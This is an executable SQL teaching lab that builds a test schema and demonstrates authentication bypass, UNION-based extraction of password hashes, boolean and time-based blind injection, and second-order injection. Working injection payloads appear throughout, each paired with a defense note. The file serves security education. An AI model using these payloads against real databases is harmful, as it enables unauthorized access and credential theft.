-- ═══════════════════════════════════════════════════════════════
-- FLLC SQL INJECTION LAB — Executable Exercise File
-- Run against a test database only. Never against production.
-- ═══════════════════════════════════════════════════════════════

-- STEP 1: Create test schema
CREATE TABLE IF NOT EXISTS users (
    id          SERIAL PRIMARY KEY,
    username    VARCHAR(50) NOT NULL,
    password    VARCHAR(255) NOT NULL,
    email       VARCHAR(100),
    role        VARCHAR(20) DEFAULT 'user',
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS products (
    id          SERIAL PRIMARY KEY,
    name        VARCHAR(100) NOT NULL,
    price       DECIMAL(10,2),
    category    VARCHAR(50),
    stock       INT DEFAULT 0
);

CREATE TABLE IF NOT EXISTS orders (
    id          SERIAL PRIMARY KEY,
    user_id     INT REFERENCES users(id),
    product_id  INT REFERENCES products(id),
    quantity    INT,
    total       DECIMAL(10,2),
    order_date  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- STEP 2: Seed test data
INSERT INTO users (username, password, email, role) VALUES
('admin', 'hashed_admin_pw_2026', 'admin@fllc.net', 'admin'),
('analyst', 'hashed_analyst_pw', 'analyst@fllc.net', 'user'),
('readonly', 'hashed_readonly_pw', 'ro@fllc.net', 'readonly');

INSERT INTO products (name, price, category, stock) VALUES
('Network Scanner Pro', 299.99, 'tools', 50),
('Compliance Audit Kit', 499.99, 'compliance', 30),
('Threat Intel Feed', 199.99, 'intel', 100),
('Forensic Toolkit', 899.99, 'forensics', 15);

INSERT INTO orders (user_id, product_id, quantity, total) VALUES
(2, 1, 1, 299.99),
(2, 3, 2, 399.98),
(3, 2, 1, 499.99);

-- ═══════════════════════════════════════════════════════════════
-- EXERCISE 1: Classic WHERE clause injection
-- The vulnerable query pattern (DO NOT USE IN PRODUCTION):
--   SELECT * FROM users WHERE username = '{input}' AND password = '{input}'
--
-- Attack input for username:  admin' --
-- Attack input for password:  anything
-- Result: Bypasses authentication
-- ═══════════════════════════════════════════════════════════════

-- Simulated vulnerable query:
SELECT * FROM users WHERE username = 'admin' AND password = 'wrong';
-- Returns 0 rows (correct behavior)

-- Simulated injected query:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
-- Returns admin row (authentication bypass)

-- DEFENSE: Parameterized query (pseudocode)
-- PREPARE stmt FROM 'SELECT * FROM users WHERE username = ? AND password = ?';
-- EXECUTE stmt USING @username, @password;

-- ═══════════════════════════════════════════════════════════════
-- EXERCISE 2: UNION-based data extraction
-- ═══════════════════════════════════════════════════════════════

-- Normal product search:
SELECT name, price FROM products WHERE category = 'tools';

-- Injected to extract user table:
-- Input: ' UNION SELECT username, password FROM users --
SELECT name, price FROM products WHERE category = ''
UNION SELECT username, CAST(password AS VARCHAR) FROM users;
-- Returns product rows + all usernames and password hashes

-- DEFENSE: Input validation + least privilege
-- The application DB user should NOT have SELECT on users table

-- ═══════════════════════════════════════════════════════════════
-- EXERCISE 3: Blind boolean-based injection
-- ═══════════════════════════════════════════════════════════════

-- Attacker determines if admin exists:
SELECT * FROM products WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0;
-- If products return: admin exists
-- If no products: admin does not exist

-- Attacker extracts password length:
SELECT * FROM products WHERE id = 1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10;

-- DEFENSE: WAF rules + error message suppression + query timeouts

-- ═══════════════════════════════════════════════════════════════
-- EXERCISE 4: Time-based blind injection
-- ═══════════════════════════════════════════════════════════════

-- PostgreSQL:
-- SELECT * FROM products WHERE id = 1; SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin')>0 THEN pg_sleep(5) ELSE pg_sleep(0) END;

-- MySQL:
-- SELECT * FROM products WHERE id = 1 AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0, SLEEP(5), 0);

-- If response takes 5 seconds: condition is true

-- DEFENSE: Query execution time limits, connection pooling with timeouts

-- ═══════════════════════════════════════════════════════════════
-- EXERCISE 5: Second-order injection
-- ═══════════════════════════════════════════════════════════════

-- Step 1: Attacker registers with malicious username
INSERT INTO users (username, password, email) VALUES
('admin''--', 'password123', 'evil@attacker.com');

-- Step 2: Application later uses that username in a query:
-- UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
-- This updates the REAL admin's password

-- DEFENSE: Parameterize ALL queries, including those using stored data

-- ═══════════════════════════════════════════════════════════════
-- CLEANUP
-- ═══════════════════════════════════════════════════════════════
-- DROP TABLE IF EXISTS orders;
-- DROP TABLE IF EXISTS products;
-- DROP TABLE IF EXISTS users;
